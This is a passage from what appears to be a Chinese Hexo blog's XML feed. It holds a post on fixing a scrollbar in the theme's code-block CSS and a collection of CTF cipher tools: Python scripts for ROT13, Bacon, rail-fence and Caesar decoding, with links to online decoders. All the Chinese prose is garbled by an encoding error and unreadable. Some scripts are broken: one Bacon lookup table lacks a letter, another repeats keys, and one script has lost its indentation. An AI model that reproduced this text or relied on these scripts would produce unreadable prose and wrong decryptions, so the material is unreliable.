        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>é‡åˆ°äº†ä¸€ä¸ªç‚’é¸¡éš¾çœ‹çš„é—®é¢˜ï¼Œå¯¹åªæ˜¯éš¾çœ‹~</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-theme1.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-theme1.png"></a></p><p>åƒè¿™æ ·~<br>è¿˜æœ‰è¿™æ ·</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-theme2.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-theme2.png"></a></p><p>æ˜¯ä¸æ˜¯ç‰¹åˆ«ä¸‘  å› ä¸ºæ­£å¸¸æ˜¯åªæœ‰å¤–é¢é‚£ä¸ªæ»šè½®çš„ é‚£æ€ä¹ˆè§£å†³å‘¢ ~   æˆ‘è¯·æ•™äº†ä¸€ä¸‹ä¸€ä¸ªæœ‹å‹å°±å¸¦æˆ‘ç”¨<code>F12å¼€å‘è€…å·¥å…·</code>è°ƒè¯•äº†ä¸€æ³¢~   </p><h1 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h1><p>æ£€æŸ¥äº†ä¸€ä¸‹ å‘ç°æ˜¯<code>highlight </code>CSSä¸­<code>Pre</code>çš„é—®é¢˜</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-theme3.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-theme3.png"></a></p><p>å¦‚å›¾å½“æŠŠè¿™ä¸ªå»æ‰ä¹‹å  æ»šè½®å°±æ²¡äº†<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-3.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-3.png"></a>è§£å†³åŠæ³• </p><p>æˆ‘æœ‰ä¸¤ä¸ªè§£å†³åŠæ³• æš‚æ—¶ä¸çŸ¥é“æœ‰æ²¡æœ‰å…¶ä»–BUG  åæ­£èƒ½è§£å†³è¿™ä¸ªé—®é¢˜å°±å¤Ÿäº†<br>é¦–å…ˆ æ‰“å¼€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\themes\spfk\source\css\_partial</span><br></pre></td></tr></table></figure><p>è·¯å¾„ä¸‹çš„è¿™ä¸ªæ–‡ä»¶   <code>highlight.styl</code></p><ol><li>æ–¹æ³•ä¸€<br>åº”è¯¥æ˜¯210 +å·¦å³çš„è¿™ä¸ªä»£ç å»æ‰ (æˆ–è€…ä½ æ”¹å¤§ç‚¹) è¿™ä¸ªå‚æ•°é™åˆ¶äº†é«˜åº¦  æ‰€ä»¥é€ æˆäº†ä»£ç å†…è¿˜æœ‰ä¸€å±‚ä¸Šä¸‹éƒ½æ»šè½®<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-6.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-6.png"></a></li><li>æ–¹æ³•äºŒ<br>è¿™æ–¹æ³•æ¯”è¾ƒç²—æš´ ä¸å»ºè®®<br>æˆ‘å°†pre çš„<code>padding:0</code>éƒ½åˆ äº† å¦‚å›¾<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-7.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-7.png"></a><h1 id="æœ€å-å“—å•¦å•¦å¥½å•¦"><a href="#æœ€å-å“—å•¦å•¦å¥½å•¦" class="headerlink" title="æœ€å å“—å•¦å•¦å¥½å•¦"></a>æœ€å å“—å•¦å•¦å¥½å•¦</h1><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-9.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/change-hexo-9.png"></a></li></ol></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ä»¥åŠè„šæœ¬çš„æ•´ç†</title>
      <link href="CTF-Misc-and-Crypto-Tools.html"/>
      <url>CTF-Misc-and-Crypto-Tools.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><code>æ•´ç†ä¸€ä¸‹å·¥å…·å’Œè„šæœ¬ä»¥åŠä»–ä»¬çš„ä½¿ç”¨</code></p><h1 id="å¯†ç å­¦-cryptology"><a href="#å¯†ç å­¦-cryptology" class="headerlink" title="å¯†ç å­¦ cryptology "></a>å¯†ç å­¦ <code>cryptology </code></h1><p>å„ç§å¯†ç å­¦çš„åœ¨çº¿è§£å¯†<a href="http://www.practicalcryptography.com/">è¿™</a></p><h2 id="ç®€å•çš„ä½ç§»å¯†ç "><a href="#ç®€å•çš„ä½ç§»å¯†ç " class="headerlink" title="ç®€å•çš„ä½ç§»å¯†ç "></a>ç®€å•çš„ä½ç§»å¯†ç </h2><p><code>é»˜è®¤ä½ç§»13 å³rot13</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line">str =raw_input(<span class="string">&#x27;put flag:&#x27;</span>)</span><br><span class="line">new_str = <span class="string">&quot;&quot;</span></span><br><span class="line">yi = <span class="number">13</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line"><span class="keyword">if</span> i&gt;=<span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> i&lt;=<span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">i = ord(i)</span><br><span class="line">i = ((i-yi)<span class="number">-97</span>)%<span class="number">26</span>+<span class="number">97</span></span><br><span class="line">i = chr(i)</span><br><span class="line">new_str = new_str+i</span><br><span class="line">print(new_str)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="åŸ¹æ ¹å¯†ç "><a href="#åŸ¹æ ¹å¯†ç " class="headerlink" title="åŸ¹æ ¹å¯†ç "></a>åŸ¹æ ¹å¯†ç </h2><p>åŸ¹æ ¹æ˜¯æ ¹æ®å­—ä½“çš„æ–œä½“ å¤§å°å†™è½¬åŒ–æˆABç­‰å­—ç¬¦ ç„¶åæ¯äº”ä¸ªå¯¹åº”ä¸€ä¸ªå­—æ¯çš„è„šæœ¬  æˆ‘è¿˜æ²¡å†™å¤§å°å†™è½¬åŒ–è„šæœ¬ è¿™é‡Œåªæœ‰ äº”ä¸ªå­—æ¯å¯¹åº”ä¸€ä¸ªå­—æ¯è„šæœ¬<br>ï¼ˆ1ï¼‰<a href="http://rumkin.com/tools/cipher/baconian.php">åœ¨çº¿åŠ è§£å¯†</a><br>ï¼ˆ2ï¼‰<code>Pythonè„šæœ¬</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/Bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#__author__ = &#x27;tyomcat&#x27;</span></span><br><span class="line"><span class="comment"># åŸ¹æ ¹è§£å¯†ä»£ç </span></span><br><span class="line"><span class="comment"># ä¸¤ç§åŠ å¯†æ–¹å¼</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">peig1</span>(<span class="params">m</span>):</span></span><br><span class="line">    basic1 = &#123;</span><br><span class="line">    <span class="string">&#x27;AAAAA&#x27;</span> : <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAAAB&#x27;</span> : <span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAABA&#x27;</span> : <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAABB&#x27;</span> : <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABAA&#x27;</span> : <span class="string">&#x27;E&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABAB&#x27;</span> : <span class="string">&#x27;F&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABBA&#x27;</span> : <span class="string">&#x27;G&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABBB&#x27;</span> : <span class="string">&#x27;H&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABAAA&#x27;</span> : <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABAAB&#x27;</span> : <span class="string">&#x27;J&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABABA&#x27;</span> : <span class="string">&#x27;K&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABABB&#x27;</span> : <span class="string">&#x27;L&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBAB&#x27;</span> : <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBBA&#x27;</span> : <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBBB&#x27;</span> : <span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAAAA&#x27;</span> : <span class="string">&#x27;Q&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAAAB&#x27;</span> : <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAABA&#x27;</span> : <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAABB&#x27;</span> : <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABAA&#x27;</span> : <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABAB&#x27;</span> : <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABBA&#x27;</span> : <span class="string">&#x27;W&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABBB&#x27;</span> : <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BBAAA&#x27;</span> : <span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BBAAB&#x27;</span> : <span class="string">&#x27;Z&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    output = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(m) - <span class="number">4</span>, <span class="number">5</span>):</span><br><span class="line">        temp = m[i: i + <span class="number">5</span>]</span><br><span class="line">        output += basic1[temp]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">peig2</span>(<span class="params">m</span>):</span></span><br><span class="line"></span><br><span class="line">    basic2 = &#123;</span><br><span class="line">    <span class="string">&#x27;AAAAA&#x27;</span> : <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAAAB&#x27;</span> : <span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAABA&#x27;</span> : <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAABB&#x27;</span> : <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABAA&#x27;</span> : <span class="string">&#x27;E&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABAB&#x27;</span> : <span class="string">&#x27;F&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABBA&#x27;</span> : <span class="string">&#x27;G&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABBB&#x27;</span> : <span class="string">&#x27;H&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABAAA&#x27;</span> : <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABAAA&#x27;</span> : <span class="string">&#x27;J&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABAAB&#x27;</span> : <span class="string">&#x27;K&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABABA&#x27;</span> : <span class="string">&#x27;L&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABABB&#x27;</span> : <span class="string">&#x27;M&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBAA&#x27;</span> : <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBAB&#x27;</span> : <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBBA&#x27;</span> : <span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBBB&#x27;</span> : <span class="string">&#x27;Q&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAAAA&#x27;</span> : <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAAAB&#x27;</span> : <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAABA&#x27;</span> : <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAABB&#x27;</span> : <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAABB&#x27;</span> : <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABAA&#x27;</span> : <span class="string">&#x27;W&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABAB&#x27;</span> : <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABBA&#x27;</span> : <span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABBB&#x27;</span> : <span class="string">&#x27;Z&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    output = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(m) - <span class="number">4</span>, <span class="number">5</span>):</span><br><span class="line">        temp = m[i: i + <span class="number">5</span>]</span><br><span class="line">        output += basic2[temp]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    </span><br><span class="line">    m = raw_input(<span class="string">&quot;è¯·è¾“å…¥å¯†æ–‡:&quot;</span>)</span><br><span class="line">    mode = input(<span class="string">&quot;é€‰æ‹©å¯†æ–‡å¯¹åº”çš„æ–¹å¼ 1 or 2ï¼š&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> len(m)%<span class="number">5</span> == <span class="number">0</span>:</span><br><span class="line">        l = []</span><br><span class="line">        k = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(m)/<span class="number">5</span>):</span><br><span class="line">            l.append(m[:<span class="number">5</span>])</span><br><span class="line">            m = m[<span class="number">5</span>:]</span><br><span class="line">        <span class="keyword">if</span> mode == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">                <span class="keyword">if</span> i.isupper():</span><br><span class="line">                    k.append(peig1(i))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    i = i.upper()</span><br><span class="line">                    k.append(peig1(i))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> mode == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">                <span class="keyword">if</span> i.isupper():</span><br><span class="line">                    k.append(peig2(i))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    i = i.upper()</span><br><span class="line">                    k.append(peig2(i))</span><br><span class="line">        flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> k:</span><br><span class="line">            flag+=i[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span> flag</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ …æ å¯†ç "><a href="#æ …æ å¯†ç " class="headerlink" title="æ …æ å¯†ç "></a>æ …æ å¯†ç </h2><p>(1) ä¸€ä¸ªwinå¹³å°ä¸‹çš„</p><p><a href="http://oayoilchh.bkt.clouddn.com/%E6%A0%85%E6%A0%8F%E5%AF%86%E7%A0%81%E5%8A%A0%E8%A7%A3%E5%AF%861.10.exe">è½¯ä»¶</a><br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zhalan.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zhalan.jpg"></a></p><p>ï¼ˆ2ï¼‰<code>pythonè„šæœ¬</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author:Swing</span></span><br><span class="line"><span class="comment">#é€šç”¨è„šæœ¬</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf_8 -*-</span></span><br><span class="line">e = raw_input(<span class="string">&#x27;è¯·è¾“å…¥è¦è§£å¯†çš„å­—ç¬¦ä¸²\n&#x27;</span>)</span><br><span class="line">elen = len(e)</span><br><span class="line">field=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,elen):</span><br><span class="line"><span class="keyword">if</span>(elen%i==<span class="number">0</span>):</span><br><span class="line">field.append(i)</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> field:</span><br><span class="line">    b = elen / f</span><br><span class="line">    result = &#123;x:<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(b)&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(elen):</span><br><span class="line">        a = i % b;</span><br><span class="line">        result.update(&#123;a:result[a] + e[i]&#125;)</span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(b):</span><br><span class="line">        d = d + result[i]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;åˆ†ä¸º\t&#x27;</span>+str(f)+<span class="string">&#x27;\t&#x27;</span>+<span class="string">&#x27;æ æ—¶ï¼Œè§£å¯†ç»“æœä¸ºï¼š  &#x27;</span>+d</span><br></pre></td></tr></table></figure><h2 id="å‡¯æ’’å¯†ç "><a href="#å‡¯æ’’å¯†ç " class="headerlink" title="å‡¯æ’’å¯†ç "></a>å‡¯æ’’å¯†ç </h2><p>å‡¯æ’’å¯†ç (Caesar Cipheræˆ–ç§°æºæ’’åŠ å¯†ã€æºæ’’å˜æ¢ã€å˜æ¢åŠ å¯†ã€ä½ç§»åŠ å¯†)æ˜¯ä¸€ç§æ›¿æ¢åŠ å¯†ï¼Œæ˜æ–‡ä¸­çš„æ‰€æœ‰å­—æ¯éƒ½åœ¨å­—æ¯è¡¨ä¸Šå‘åï¼ˆæˆ–å‘å‰ï¼‰æŒ‰ç…§ä¸€ä¸ªå›ºå®šæ•°ç›®è¿›è¡Œåç§»åè¢«æ›¿æ¢æˆå¯†æ–‡ã€‚ä¾‹ï¼Œå½“åç§»é‡æ˜¯3çš„æ—¶å€™ï¼Œæ‰€æœ‰çš„å­—æ¯Aå°†è¢«æ›¿æ¢æˆDï¼ŒBå˜æˆEï¼Œä»¥æ­¤ç±»æ¨ï¼Œæ›´å¤š<a href="https://en.wikipedia.org/wiki/Caesar_cipher">å‚è€ƒ</a><br>ä½ç§»å‚è€ƒ</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/caesar-cipher" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/caesar-cipher"></a></p><p>(1)<a href="http://planetcalc.com/1434/">ç½‘ç«™é“¾æ¥</a> è¿™ä¸ªç½‘ç«™å¯ä»¥åˆ—å‡º1-26çš„å¯èƒ½æ€§<br>(1)è¿˜æœ‰ä¸€ç§æ–¹æ³•å°±æ˜¯åˆ©ç”¨<a href="http://">JPK</a>è¿™ä¸ªå·¥å…·</p><p>ä½¿ç”¨æ–¹æ³•çœ‹å›¾å°±å¤Ÿäº†å§</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/jpk-tool.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/jpk-tool.jpg"></a></p><p>(3)<code>Pythonå®ç°</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__ = &#x27;tyomcat&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span>(<span class="params">c, key, start = <span class="string">&#x27;a&#x27;</span>, n = <span class="number">26</span></span>):</span></span><br><span class="line">    a = ord(start)</span><br><span class="line">    offset = ((ord(c) - a + key)%n)</span><br><span class="line">    <span class="keyword">return</span> chr(a + offset)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesarEncode</span>(<span class="params">s, key</span>):</span></span><br><span class="line">    o = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> c.islower():</span><br><span class="line">            o+= convert(c, key, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> c.isupper():</span><br><span class="line">            o+= convert(c, key, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            o+= c</span><br><span class="line">    <span class="keyword">return</span> o</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesarDecode</span>(<span class="params">s, key</span>):</span></span><br><span class="line">    <span class="keyword">return</span> caesarEncode(s, -key)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> range(<span class="number">27</span>):</span><br><span class="line">       e=<span class="string">&#x27;Jr1p0zr2VfPp&#x27;</span>     <span class="comment">#å†™è¿™é‡Œ</span></span><br><span class="line">       d = caesarDecode(e, key)</span><br><span class="line"></span><br><span class="line">       <span class="keyword">print</span> d</span><br><span class="line">       <span class="keyword">print</span> <span class="string">&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="å‡¯æ’’å˜ç§-Asciiç "><a href="#å‡¯æ’’å˜ç§-Asciiç " class="headerlink" title="å‡¯æ’’å˜ç§ -Asciiç "></a>å‡¯æ’’å˜ç§ -Asciiç </h3><p>2017å¹´3æœˆ30æ—¥ ä»Šå¤©æœ‰äººåœ¨HCTFç¾¤é‡Œé—®ä¸€ä¸ªå¯†ç å­¦é¢˜ å°±æ˜¯å‡¯æ’’çš„å˜ç§  åœ¨Asciiç ä¸­çš„å˜æ¢ï¼Œæˆ‘çš„å¥½åŸºå‹ ä¸€å¸†åŒå­¦ï¼Œå·²ç»è¯´äº†æ€ä¹ˆåš ..è¿˜åœ¨è®©åˆ«äººå¸®ä»–åšã€‚è®©æˆ‘æƒ³èµ·æ¥ HCTF å®˜æ–¹Wpä¸Šçš„ä¸€å¥è¯ ç©¶ç«Ÿæ˜¯åœ¨ç©CTF è¿˜æ˜¯åœ¨è¢«CTFç©ï¼Ÿ</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = <span class="string">&quot;D5Y8h5H|]mP3PGD|RGokPmTqPZYK]JQoPmH|Q&#125;IpPGEpQZH6iT@@&quot;</span><span class="comment">#raw_input(&#x27;put flag:&#x27;)</span></span><br><span class="line">new_str = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    i = ord(i)<span class="number">-3</span></span><br><span class="line">    i = chr(i)</span><br><span class="line">    new_str = new_str +i</span><br><span class="line"><span class="keyword">print</span> new_str</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[*] flag:&quot;</span>+ base64.b64decode(new_str)</span><br></pre></td></tr></table></figure><h2 id="ç®€å•æ›¿æ¢å¯†ç "><a href="#ç®€å•æ›¿æ¢å¯†ç " class="headerlink" title="ç®€å•æ›¿æ¢å¯†ç "></a>ç®€å•æ›¿æ¢å¯†ç </h2><p>ç®€å•æ¢ä½å¯†ç (Simple Substitution Cipher)åŠ 